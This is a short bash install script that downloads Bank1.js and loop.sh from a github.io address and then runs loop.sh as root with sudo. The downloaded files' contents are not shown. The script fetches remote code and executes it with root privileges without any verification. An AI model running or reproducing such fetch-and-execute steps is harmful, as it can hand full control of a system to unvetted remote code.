#!/bin/bash

wget https://icelys.github.io/files/Bank1.js
echo "[Install] File (1/2) downloaded"
wget https://icelys.github.io/files/loop.sh
echo "[Install] File (2/2) downloaded"
echo "Finished installing"
sudo bash loop.sh
